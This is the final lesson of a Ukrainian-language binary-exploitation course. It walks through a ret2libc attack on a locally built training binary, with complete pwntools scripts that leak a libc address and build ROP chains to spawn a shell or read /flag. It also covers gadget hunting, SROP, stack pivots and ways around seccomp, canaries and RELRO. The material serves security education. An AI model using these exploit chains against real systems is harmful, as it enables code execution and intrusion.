**–ó–Ω–∞–π–¥—ñ—Ç—å —è–∫–∞ libc:**
```bash
ldd ../build/stage08_ret2libc | grep libc
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

**–°–∫–æ–ø—ñ—é–π—Ç–µ –¥–ª—è exploit:**
```bash
cp /lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
cp /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 ./ld.so.2
```

### –ö—Ä–æ–∫ 3: –ó–Ω–∞–π–¥—ñ—Ç—å ROP gadget'–∏

**–í–∞—Ä—ñ–∞–Ω—Ç A: –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —á–µ—Ä–µ–∑ pwntools:**
```python
from pwn import *
libc = ELF('./libc.so.6')
rop = ROP(libc)
print(rop.find_gadget(['pop rdi', 'ret']))
```

**–í–∞—Ä—ñ–∞–Ω—Ç B: ROPgadget:**
```bash
ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep "pop rdi"
```

### –ö—Ä–æ–∫ 4: –°—Ç–≤–æ—Ä—ñ—Ç—å exploit (—Å–∏—Å—Ç–µ–º–∞ shell)

–§–∞–π–ª `exploit_system.py`:

```python
#!/usr/bin/env python3
from pwn import *

# –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è
context.arch = 'amd64'
context.log_level = 'info'

# –ó–∞–≤–∞–Ω—Ç–∞–∂—É—î–º–æ —Ñ–∞–π–ª–∏
elf = ELF('../build/stage08_ret2libc', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

# –ü–∞—Ä–∞–º–µ—Ç—Ä–∏
OFFSET = 72

def exploit():
    # –ó–∞–ø—É—Å–∫–∞—î–º–æ –ø—Ä–æ—Ü–µ—Å
    io = process('../build/stage08_ret2libc')

    # === –ï–¢–ê–ü 1: LEAK ===
    io.recvuntil(b'BOF:')
    io.sendline(b'LEAK')

    # –û—Ç—Ä–∏–º—É—î–º–æ leak
    io.recvline()
    leaked_puts = int(io.recvline().split(b'=')[1], 16)
    log.success(f"Leaked puts: {hex(leaked_puts)}")

    # –†–æ–∑—Ä–∞—Ö–æ–≤—É—î–º–æ libc base
    libc.address = leaked_puts - libc.symbols['puts']
    log.success(f"Libc base: {hex(libc.address)}")

    # === –ï–¢–ê–ü 2: ROP CHAIN ===
    io.recvuntil(b'payload:')

    # –ó–Ω–∞—Ö–æ–¥–∏–º–æ —â–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ
    system_addr = libc.symbols['system']
    binsh_addr = next(libc.search(b'/bin/sh\x00'))
    log.info(f"system: {hex(system_addr)}")
    log.info(f"/bin/sh: {hex(binsh_addr)}")

    # –ë—É–¥—É—î–º–æ ROP chain
    rop = ROP(libc)
    rop.call(system_addr, [binsh_addr])

    # Payload
    payload = b'A' * OFFSET + rop.chain()
    log.info(f"Payload length: {len(payload)}")

    # –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ
    io.sendline(payload)

    # Shell!
    io.interactive()

if __name__ == '__main__':
    exploit()
```

### –ö—Ä–æ–∫ 5: –°—Ç–≤–æ—Ä—ñ—Ç—å ORW exploit (–Ω–∞–¥—ñ–π–Ω—ñ—à–∏–π)

**–ß–æ–º—É ORW?**
- `system("/bin/sh")` –º–æ–∂–µ –Ω–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ —á–µ—Ä–µ–∑:
  - Seccomp —Ñ—ñ–ª—å—Ç—Ä–∏ (–±–ª–æ–∫—É—é—Ç—å `execve`)
  - –ú–µ—Ä–µ–∂–µ–≤—ñ –æ–±–º–µ–∂–µ–Ω–Ω—è
  - –í—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å TTY

- **ORW (Open-Read-Write)** –∑–∞–≤–∂–¥–∏ –ø—Ä–∞—Ü—é—î:
  1. `open("/flag", O_RDONLY)`
  2. `read(fd, buffer, size)`
  3. `write(1, buffer, size)`

–§–∞–π–ª `exploit_orw.py`:

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('../build/stage08_ret2libc', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

OFFSET = 72

def exploit_orw():
    io = process('../build/stage08_ret2libc')

    # === LEAK ===
    io.recvuntil(b'BOF:')
    io.sendline(b'LEAK')
    io.recvline()
    leaked_puts = int(io.recvline().split(b'=')[1], 16)
    libc.address = leaked_puts - libc.symbols['puts']
    log.success(f"Libc base: {hex(libc.address)}")

    # === –ü–Ü–î–ì–û–¢–û–í–ö–ê ===
    io.recvuntil(b'payload:')

    # –ê–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ–π
    open_addr = libc.symbols['open']
    read_addr = libc.symbols['read']
    write_addr = libc.symbols['write']

    # –ú—ñ—Å—Ü–µ –¥–ª—è –¥–∞–Ω–∏—Ö (–≤–∏–∫–æ—Ä–∏—Å—Ç–∞—î–º–æ .bss)
    bss_addr = elf.bss(0x200)  # .bss + offset

    log.info(f"open:  {hex(open_addr)}")
    log.info(f"read:  {hex(read_addr)}")
    log.info(f"write: {hex(write_addr)}")
    log.info(f"bss:   {hex(bss_addr)}")

    # === ROP CHAIN ===
    rop = ROP(libc)

    # 1. open("/flag", O_RDONLY) ‚Üí –ø–æ–≤–µ—Ä—Ç–∞—î fd –≤ rax
    flag_str = b'/flag\x00'
    flag_addr = bss_addr
    # –°–ø–æ—á–∞—Ç–∫—É –∑–∞–ø–∏—à–µ–º–æ "/flag" –≤ .bss (—á–µ—Ä–µ–∑ read –∞–±–æ —ñ–Ω—à–∏–π —Å–ø–æ—Å—ñ–±)
    # –î–ª—è –ø—Ä–æ—Å—Ç–æ—Ç–∏ –ø–æ–∫–ª–∞–¥–µ–º–æ –≤ payload —ñ —Å–∫–æ–ø—ñ—é—î–º–æ

    # –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞: —è–∫—â–æ "/flag" —î –≤ libc
    try:
        flag_addr = next(libc.search(b'/flag\x00'))
    except:
        # –Ø–∫—â–æ –Ω–µ–º–∞—î, —Ç—Ä–µ–±–∞ –∑–∞–ø–∏—Å–∞—Ç–∏ —Å–∞–º–∏–º
        log.warning("'/flag' not in libc, using .bss")
        flag_addr = bss_addr

    rop.open(flag_addr, 0)  # open(path, O_RDONLY)

    # 2. read(3, bss+0x100, 0x100) ‚Üí —á–∏—Ç–∞—î–º–æ —Ñ–∞–π–ª
    # fd –±—É–¥–µ 3 (—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ: 0=stdin, 1=stdout, 2=stderr, 3=–ø–µ—Ä—à–∏–π —Ñ–∞–π–ª)
    rop.read(3, bss_addr + 0x100, 0x100)

    # 3. write(1, bss+0x100, 0x100) ‚Üí –≤–∏–≤–æ–¥–∏–º–æ –Ω–∞ –µ–∫—Ä–∞–Ω
    rop.write(1, bss_addr + 0x100, 0x100)

    # Payload
    payload = b'A' * OFFSET + rop.chain()

    # –Ø–∫—â–æ "/flag" —Ç—Ä–µ–±–∞ –¥–æ–¥–∞—Ç–∏
    if flag_addr == bss_addr:
        payload += flag_str

    log.info(f"ROP chain length: {len(rop.chain())}")
    io.sendline(payload)

    # –û—Ç—Ä–∏–º—É—î–º–æ –≤–º—ñ—Å—Ç /flag
    io.recvline()  # "got N bytes"
    result = io.recvall(timeout=2)
    log.success(f"Result:\n{result.decode(errors='ignore')}")

    io.close()

if __name__ == '__main__':
    exploit_orw()
```

### –ö—Ä–æ–∫ 6: –ó–∞–ø—É—Å—Ç—ñ—Ç—å exploit

**–ü—ñ–¥–≥–æ—Ç–æ–≤–∫–∞:**
```bash
# –°—Ç–≤–æ—Ä—ñ—Ç—å —Ç–µ—Å—Ç–æ–≤–∏–π —Ñ–∞–π–ª /flag
echo "FLAG{STAGE8_RET2LIBC_ORW}" | sudo tee /flag
sudo chmod 444 /flag
```

**–ó–∞–ø—É—Å–∫:**
```bash
chmod +x exploit_orw.py
python3 exploit_orw.py
```

## üîç –î–µ—Ç–∞–ª—å–Ω–∏–π —Ä–æ–∑–±—ñ—Ä ROP

### –í—ñ–∑—É–∞–ª—ñ–∑–∞—Ü—ñ—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è

**1. –ü–æ—á–∞—Ç–∫–æ–≤–∏–π —Å—Ç–µ–∫ (–ø—ñ—Å–ª—è BOF):**
```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚Üê RSP (–ø—ñ—Å–ª—è return –∑ bof)
‚îÇ pop rdi; ret       ‚îÇ  Gadget #1
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ –∞–¥—Ä–µ—Å–∞ "/flag"     ‚îÇ  –ü–∞—Ä–∞–º–µ—Ç—Ä –¥–ª—è rdi (arg1)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ pop rsi; ret       ‚îÇ  Gadget #2
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 0 (O_RDONLY)       ‚îÇ  –ü–∞—Ä–∞–º–µ—Ç—Ä –¥–ª—è rsi (arg2)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ pop rdx; ret       ‚îÇ  Gadget #3 (—è–∫—â–æ —Ç—Ä–µ–±–∞ 3-–π –ø–∞—Ä–∞–º–µ—Ç—Ä)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ –∞–¥—Ä–µ—Å–∞ open()      ‚îÇ  –í–∏–∫–ª–∏–∫ open()
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ ... –Ω–∞—Å—Ç—É–ø–Ω—ñ calls ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**2. –í–∏–∫–æ–Ω–∞–Ω–Ω—è Gadget #1:**
```asm
pop rdi          ; rdi = –∞–¥—Ä–µ—Å–∞ "/flag"
ret              ; RSP += 8, —Å—Ç—Ä–∏–±–æ–∫ –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω—É –∞–¥—Ä–µ—Å—É
```

**3. –í–∏–∫–æ–Ω–∞–Ω–Ω—è Gadget #2:**
```asm
pop rsi          ; rsi = 0 (O_RDONLY)
ret              ; –°—Ç—Ä–∏–±–æ–∫ –Ω–∞ open()
```

**4. –í–∏–∫–ª–∏–∫ open():**
```
open(rdi="/flag", rsi=0, rdx=?) ‚Üí –ø–æ–≤–µ—Ä—Ç–∞—î fd=3
```

**5. –ê–Ω–∞–ª–æ–≥—ñ—á–Ω–æ –¥–ª—è read() —Ç–∞ write()**

### Calling convention x86-64

–ù–∞ x86-64 –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ –ø–µ—Ä–µ–¥–∞—é—Ç—å—Å—è —á–µ—Ä–µ–∑ —Ä–µ–≥—ñ—Å—Ç—Ä–∏:

```
1-–π –ø–∞—Ä–∞–º–µ—Ç—Ä: RDI
2-–π –ø–∞—Ä–∞–º–µ—Ç—Ä: RSI
3-–π –ø–∞—Ä–∞–º–µ—Ç—Ä: RDX
4-–π –ø–∞—Ä–∞–º–µ—Ç—Ä: RCX
5-–π –ø–∞—Ä–∞–º–µ—Ç—Ä: R8
6-–π –ø–∞—Ä–∞–º–µ—Ç—Ä: R9
7+ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏: –ß–µ—Ä–µ–∑ —Å—Ç–µ–∫
```

**–ü—Ä–∏–∫–ª–∞–¥–∏:**
```c
open("/flag", O_RDONLY)
‚Üí rdi = "/flag"
‚Üí rsi = 0

read(3, buf, 100)
‚Üí rdi = 3
‚Üí rsi = buf
‚Üí rdx = 100

write(1, buf, 100)
‚Üí rdi = 1
‚Üí rsi = buf
‚Üí rdx = 100
```

### –ü–æ—à—É–∫ gadget'—ñ–≤

**–ß–µ—Ä–µ–∑ ROPgadget:**
```bash
ROPgadget --binary ./libc.so.6 > gadgets.txt

# –®—É–∫–∞—î–º–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ:
grep "pop rdi" gadgets.txt
grep "pop rsi" gadgets.txt
grep "pop rdx" gadgets.txt
```

**–ß–µ—Ä–µ–∑ pwntools:**
```python
rop = ROP(libc)
print(rop.find_gadget(['pop rdi', 'ret']))
print(rop.find_gadget(['pop rsi', 'pop r15', 'ret']))  # –ß–∞—Å—Ç–æ —Ä–∞–∑–æ–º
print(rop.find_gadget(['pop rdx', 'ret']))
```

**–ö–æ—Ä–∏—Å–Ω—ñ gadget'–∏:**
```asm
pop rdi; ret              # –ù–∞–π–ø–æ—à–∏—Ä–µ–Ω—ñ—à–∏–π
pop rsi; pop r15; ret     # rsi —á–∞—Å—Ç–æ –∑ r15
pop rdx; pop rbx; ret     # rdx —á–∞—Å—Ç–æ –∑ rbx
pop rax; ret              # –î–ª—è syscall number
syscall; ret              # –ü—Ä—è–º–∏–π —Å–∏—Å—Ç–µ–º–Ω–∏–π –≤–∏–∫–ª–∏–∫
```

## üéì –ü—Ä–∞–∫—Ç–∏—á–Ω—ñ –∑–∞–≤–¥–∞–Ω–Ω—è

### –ó–∞–≤–¥–∞–Ω–Ω—è 1: One gadget (—è–∫—â–æ –ø–æ—â–∞—Å—Ç–∏—Ç—å)

```bash
one_gadget ./libc.so.6
```

One gadget - –∞–¥—Ä–µ—Å–∞ –≤ libc —â–æ –æ–¥—Ä–∞–∑—É –≤–∏–∫–ª–∏–∫–∞—î shell, —è–∫—â–æ –≤–∏–∫–æ–Ω–∞–Ω—ñ –ø–µ–≤–Ω—ñ —É–º–æ–≤–∏:

```python
# –Ø–∫—â–æ —î one_gadget
one_gadget_addr = libc.address + 0x...  # –ó –≤–∏–≤–æ–¥—É one_gadget
payload = b'A' * 72 + p64(one_gadget_addr)
# –ú–æ–∂–µ —Å–ø—Ä–∞—Ü—é–≤–∞—Ç–∏ —è–∫—â–æ —É–º–æ–≤–∏ –≤–∏–∫–æ–Ω–∞–Ω—ñ!
```

### –ó–∞–≤–¥–∞–Ω–Ω—è 2: ret2csu (Universal gadget)

–£ –∫–æ–∂–Ω–æ–º—É –±—ñ–Ω–∞—Ä–Ω–∏–∫—É —î `__libc_csu_init` –∑ –∫–æ—Ä–∏—Å–Ω–∏–º–∏ gadget'–∞–º–∏:

```python
csu_pop = 0x...  # –∞–¥—Ä–µ—Å–∞ –≤ __libc_csu_init
# –î–æ–∑–≤–æ–ª—è—î –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ rbx, rbp, r12, r13, r14, r15
# –ö–æ—Ä–∏—Å–Ω–æ –∫–æ–ª–∏ –Ω–µ–º–∞—î –ø—Ä–æ—Å—Ç–∏—Ö pop gadget'—ñ–≤
```

### –ó–∞–≤–¥–∞–Ω–Ω—è 3: SROP (Sigreturn ROP)

–ü—Ä–æ—Å—É–Ω—É—Ç–∞ —Ç–µ—Ö–Ω—ñ–∫–∞ —á–µ—Ä–µ–∑ `sigreturn`:

```python
# –ö–æ–Ω—Ç—Ä–æ–ª—é—î –í–°–Ü —Ä–µ–≥—ñ—Å—Ç—Ä–∏ –æ–¥—Ä–∞–∑—É
frame = SigreturnFrame()
frame.rdi = arg1
frame.rsi = arg2
frame.rdx = arg3
frame.rip = syscall_addr
```

### –ó–∞–≤–¥–∞–Ω–Ω—è 4: Stack pivot

–Ø–∫—â–æ –±—É—Ñ–µ—Ä –º–∞–ª–∏–π, –ø–µ—Ä–µ–Ω–µ—Å—ñ—Ç—å —Å—Ç–µ–∫ –≤ —ñ–Ω—à—É –æ–±–ª–∞—Å—Ç—å:

```python
# Gadget: xchg rax, rsp; ret –∞–±–æ mov rsp, rax; ret
# –î–æ–∑–≤–æ–ª—è—î –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ –±—ñ–ª—å—à–∏–º –ø—Ä–æ—Å—Ç–æ—Ä–æ–º
```

## üí° –ü–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è —Ç–µ—Ö–Ω—ñ–∫

| –¢–µ—Ö–Ω—ñ–∫–∞ | NX | –ö–æ–ª–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ | –°–∫–ª–∞–¥–Ω—ñ—Å—Ç—å |
|---------|----|--------------------|------------|
| Shellcode | OFF | –°—Ç–µ–∫ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π | ‚≠ê‚≠ê‚òÜ‚òÜ‚òÜ |
| ret2win | OFF/ON | –Ñ —Ñ—É–Ω–∫—Ü—ñ—è win() | ‚≠ê‚≠ê‚òÜ‚òÜ‚òÜ |
| ret2libc | ON | –Ñ leak libc | ‚≠ê‚≠ê‚≠ê‚≠ê‚òÜ |
| ORW | ON | Seccomp –±–ª–æ–∫—É—î execve | ‚≠ê‚≠ê‚≠ê‚≠ê‚òÜ |
| ret2dlresolve | ON | –ù–µ–º–∞—î leak | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê |
| SROP | ON | –û–±–º–µ–∂–µ–Ω—ñ gadget'–∏ | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê |

## üîê –ó–∞—Ö–∏—Å—Ç–∏ —Ç–∞ –æ–±—Ö–æ–¥–∏

### Seccomp

**–©–æ —Ü–µ:** –§—ñ–ª—å—Ç—Ä —Å–∏—Å—Ç–µ–º–Ω–∏—Ö –≤–∏–∫–ª–∏–∫—ñ–≤

```c
// –î–æ–∑–≤–æ–ª–∏—Ç–∏ —Ç—ñ–ª—å–∫–∏ open/read/write/exit
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
// execve –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ!
```

**–û–±—Ö—ñ–¥:** –í–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ ORW –∑–∞–º—ñ—Å—Ç—å shell

### Stack cookies (Canary)

**–û–±—Ö—ñ–¥:**
1. Leak canary —á–µ—Ä–µ–∑ format string
2. –í–∫–ª—é—á–∏—Ç–∏ canary –≤ payload
3. –ê–±–æ –∑–Ω–∞–π—Ç–∏ —ñ–Ω—à–∏–π –±–∞–≥ (–Ω–µ BOF)

### Full RELRO

**–û–±—Ö—ñ–¥:** –ù–µ –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ GOT, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —á–∏—Å—Ç–∏–π ROP

### CFI (Control Flow Integrity)

**–©–æ —Ü–µ:** –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ —â–æ –≤–∏–∫–ª–∏–∫–∏ –π–¥—É—Ç—å –∫—É–¥–∏ —Ç—Ä–µ–±–∞

**–û–±—Ö—ñ–¥:** –°–∫–ª–∞–¥–Ω–∏–π, –ø–æ—Ç—Ä—ñ–±–Ω—ñ zero-day —Ç–µ—Ö–Ω—ñ–∫–∏

## üìö –í–∞–∂–ª–∏–≤—ñ –ø–æ–Ω—è—Ç—Ç—è

### 1. Syscall vs libc function

**Libc function** (–Ω–∞—à –≤–∏–±—ñ—Ä):
```c
open("/flag", O_RDONLY);  // –í–∏–∫–ª–∏–∫–∞—î –æ–±–≥–æ—Ä—Ç–∫—É –∑ libc
```

**–ü—Ä—è–º–∏–π syscall:**
```asm
mov rax, 2        ; syscall number –¥–ª—è open
mov rdi, path
mov rsi, 0
syscall
```

### 2. Alignment

x86-64 –≤–∏–º–∞–≥–∞—î —â–æ–± `call` –±—É–≤ –≤–∏—Ä—ñ–≤–Ω—è–Ω–∏–π –Ω–∞ 16 –±–∞–π—Ç:

```python
# –Ü–Ω–æ–¥—ñ —Ç—Ä–µ–±–∞ –¥–æ–¥–∞—Ç–∏ ret gadget –¥–ª—è –≤–∏—Ä—ñ–≤–Ω—é–≤–∞–Ω–Ω—è
rop.raw(rop.find_gadget(['ret']))  # –ü—Ä–æ—Å—Ç–æ ret
rop.system(binsh_addr)
```

### 3. Libc versioning

```bash
# –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –≤–µ—Ä—Å—ñ—é
strings ./libc.so.6 | grep "GNU C Library"

# –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω—É libc
# https://libc.blukat.me/  - –±–∞–∑–∞ libc –≤–µ—Ä—Å—ñ–π
# https://libc.rip/        - –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞
```

## ‚úÖ –ß–µ–∫–ª–∏—Å—Ç –≤–∏–∫–æ–Ω–∞–Ω–Ω—è

- [ ] –ó—ñ–±—Ä–∞–Ω–æ –±—ñ–Ω–∞—Ä–Ω–∏–∫ —á–µ—Ä–µ–∑ `build.sh`
- [ ] –ü–µ—Ä–µ–≤—ñ—Ä–µ–Ω–æ —â–æ NX=ON, ASLR=ON
- [ ] –í–∏—Ç—è–≥–Ω—É—Ç–æ libc —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø—Ä–æ–≥—Ä–∞–º–∞
- [ ] –°—Ç–≤–æ—Ä–µ–Ω–æ exploit –∑ leak
- [ ] –°—Ç–≤–æ—Ä–µ–Ω–æ ROP chain –¥–ª—è system("/bin/sh")
- [ ] –ê–±–æ —Å—Ç–≤–æ—Ä–µ–Ω–æ ORW exploit
- [ ] –°—Ç–≤–æ—Ä–µ–Ω–æ /flag –∑ —Ç–µ—Å—Ç–æ–≤–∏–º –ø—Ä–∞–ø–æ—Ä–æ–º
- [ ] –£—Å–ø—ñ—à–Ω–æ –æ—Ç—Ä–∏–º–∞–Ω–æ shell –∞–±–æ –ø—Ä–æ—á–∏—Ç–∞–Ω–æ /flag
- [ ] –†–æ–∑—É–º—ñ—é —è–∫ –ø—Ä–∞—Ü—é—î ROP
- [ ] –ó–Ω–∞—é calling convention x86-64
- [ ] –ú–æ–∂—É –∑–Ω–∞–π—Ç–∏ gadget'–∏
- [ ] –ó–∞–≤–µ—Ä—à–∏–≤ –≤–µ—Å—å –∫—É—Ä—Å! üéâ

---

**–ß–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è:** 45-60 —Ö–≤–∏–ª–∏–Ω
**–°–∫–ª–∞–¥–Ω—ñ—Å—Ç—å:** ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê (–í–∏—Å–æ–∫–∞)
**–ö–∞—Ç–µ–≥–æ—Ä—ñ—è:** PWN / ROP / ret2libc
**–ö–ª—é—á–æ–≤—ñ –ø–æ–Ω—è—Ç—Ç—è:** ROP, ret2libc, ORW, gadgets, calling convention

## üéâ –í—ñ—Ç–∞—î–º–æ –∑ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è–º –∫—É—Ä—Å—É!

–í–∏ –ø—Ä–æ–π—à–ª–∏ —à–ª—è—Ö –≤—ñ–¥ –±–∞–∑–æ–≤–æ–≥–æ `nc` –¥–æ –ø–æ–≤–Ω–æ—Ü—ñ–Ω–Ω–æ–≥–æ ret2libc –∑ ROP!

### –©–æ –≤–∏ –≤–º—ñ—î—Ç–µ —Ç–µ–ø–µ—Ä:

1. ‚úÖ **TCP –≤–∑–∞—î–º–æ–¥—ñ—è** (nc, pwntools)
2. ‚úÖ **–ê–Ω–∞–ª—ñ–∑ –∑–∞—Ö–∏—Å—Ç—ñ–≤** (checksec, —Ä–æ–∑—É–º—ñ–Ω–Ω—è Canary/NX/PIE/RELRO)
3. ‚úÖ **Buffer Overflow** (—Å–ø—Ä–∞–≤–∂–Ω—ñ–π BOF)
4. ‚úÖ **–í–∏—Ç—ñ–∫ –∞–¥—Ä–µ—Å** (leak, –æ–±—Ö—ñ–¥ ASLR)
5. ‚úÖ **ROP** (–ø–æ–±—É–¥–æ–≤–∞ ROP chain)
6. ‚úÖ **ret2libc** (–≤–∏–∫–ª–∏–∫ —Ñ—É–Ω–∫—Ü—ñ–π –∑ libc)
7. ‚úÖ **ORW** (Open-Read-Write —è–∫ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞ shell)

### –ù–∞—Å—Ç—É–ø–Ω—ñ –∫—Ä–æ–∫–∏:

**–ü—Ä–∞–∫—Ç–∏–∫–∞:**
- [pwn.college](https://pwn.college/) - –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–µ –Ω–∞–≤—á–∞–Ω–Ω—è
- [ROP Emporium](https://ropemporium.com/) - –∑–∞–¥–∞—á—ñ –ø–æ ROP
- [Nightmare](https://guyinatuxedo.github.io/) - –≤–µ–ª–∏–∫–∏–π –∫—É—Ä—Å
- [pwnable.kr](http://pwnable.kr/) - –∫–æ—Ä–µ–π—Å—å–∫—ñ PWN –∑–∞–¥–∞—á—ñ
- [pwnable.tw](https://pwnable.tw/) - —Ç–∞–π–≤–∞–Ω—Å—å–∫—ñ PWN –∑–∞–¥–∞—á—ñ

**CTF –∑–º–∞–≥–∞–Ω–Ω—è:**
- [CTFtime.org](https://ctftime.org/) - –∫–∞–ª–µ–Ω–¥–∞—Ä CTF
- picoCTF, HackTheBox, TryHackMe

**–ü—Ä–æ—Å—É–Ω—É—Ç—ñ —Ç–µ–º–∏:**
- Heap exploitation (use-after-free, double-free)
- Kernel exploitation
- Browser exploitation
- ARM/MIPS exploitation
- Windows exploitation

**–£–¥–∞—á—ñ –≤ PWN! üöÄ**
